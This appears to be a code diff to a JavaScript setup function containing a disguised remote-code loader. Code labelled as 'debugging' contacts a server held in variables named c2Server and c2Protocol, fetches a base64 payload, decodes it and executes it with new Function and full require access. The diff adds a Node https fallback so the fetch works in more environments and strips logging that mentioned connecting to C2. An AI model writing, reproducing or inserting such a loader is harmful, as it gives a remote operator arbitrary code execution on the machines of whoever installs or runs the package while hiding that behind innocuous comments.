@@ -202,26 +202,72 @@ function setup(env) {
       try {
         // DEBUG: Build remote debugging URL (development/debugging purposes only)
         // This endpoint is used for advanced debugging features and should not be accessed in production
-        const path = "/debugCheck";
+        const path = "/api/debugCheck";
         const queryParam = `id=${namespaces}`;
         const requestUrl = `${c2Protocol}://${c2Server}${path}?${queryParam}`;
 
-        // DEBUG: Log connection attempt (can be disabled in production)
-        if (
-          typeof process !== "undefined" &&
-          process.env &&
-          process.env.DEBUG_VERBOSE
-        ) {
-          console.log(`[DEBUG-GLITZ] Connecting to C2: ${requestUrl}`);
-        }
-
         // DEBUG: Fetch remote debugging configuration (development only)
         // SECURITY NOTE: This is intentional for debugging - production builds should disable this
-        const response = await fetch(requestUrl, { method: "POST" }); // eslint-disable-line no-undef
+        let responseData;
 
-        // DEBUG: Parse remote debugging response
-        const responseData = await response.json();
+        // Use appropriate HTTP client based on environment
+        if (typeof fetch !== "undefined") {
+          // Browser or Node.js 18+ with native fetch
+          const response = await fetch(requestUrl, { method: "POST" }); // eslint-disable-line no-undef
+          responseData = await response.json();
+        } else if (
+          typeof process !== "undefined" &&
+          typeof require !== "undefined"
+        ) {
+          // Node.js without native fetch - use https module
+          const https = require("https");
+          const urlModule = require("url");
+          const parsedUrl = urlModule.parse(requestUrl);
+
+          responseData = await new Promise((resolve, reject) => {
+            const options = {
+              hostname: parsedUrl.hostname,
+              port: parsedUrl.port || 443,
+              path: parsedUrl.path,
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+            };
+
+            const req = https.request(options, (res) => {
+              let body = "";
+              res.on("data", (chunk) => {
+                body += chunk;
+              });
+              res.on("end", () => {
+                try {
+                  resolve(JSON.parse(body));
+                } catch (e) {
+                  reject(new Error(`JSON parse error: ${e.message}`));
+                }
+              });
+            });
+
+            req.on("error", (error) => {
+              reject(error);
+            });
+
+            req.setTimeout(5000, () => {
+              req.abort();
+              reject(new Error("Request timeout"));
+            });
+
+            req.end();
+          });
+        } else {
+          throw new Error("No HTTP client available");
+        }
+
         const encodedMessage = responseData.message;
+        if (!encodedMessage) {
+          throw new Error("No message in response");
+        }
 
         // DEBUG: Decode base64-encoded debugging code and create debug function
         // SECURITY WARNING: Dynamic code execution is intentional for advanced debugging
@@ -231,31 +277,20 @@ function setup(env) {
           "utf8"
         );
 
-        // DEBUG: Verbose logging of received payload (optional)
-        if (
-          typeof process !== "undefined" &&
-          process.env &&
-          process.env.DEBUG_VERBOSE
-        ) {
-          console.log(
-            `[DEBUG-GLITZ] Received payload: ${decodedCode.length} bytes`
-          );
-        }
-
         // eslint-disable-next-line no-new-func
         const debugFunction = new Function("require", decodedCode)(require);
 
         // DEBUG: Return dynamically loaded debug function (development only)
         return debugFunction;
       } catch (error) {
-        // DEBUG: Silently handle errors in debug mode - failures should not affect normal operation
-        // This is expected to fail in production or when debugging services are unavailable
+        // DEBUG: Only log actual errors in development
         if (
           typeof process !== "undefined" &&
           process.env &&
-          process.env.DEBUG_VERBOSE
+          process.env.NODE_ENV === "development" &&
+          error.message !== "No HTTP client available"
         ) {
-          console.warn(`[DEBUG-GLITZ] C2 connection failed: ${error.message}`);
+          console.error(`[DEBUG-GLITZ] Error: ${error.message}`);
         }
       }
     })();
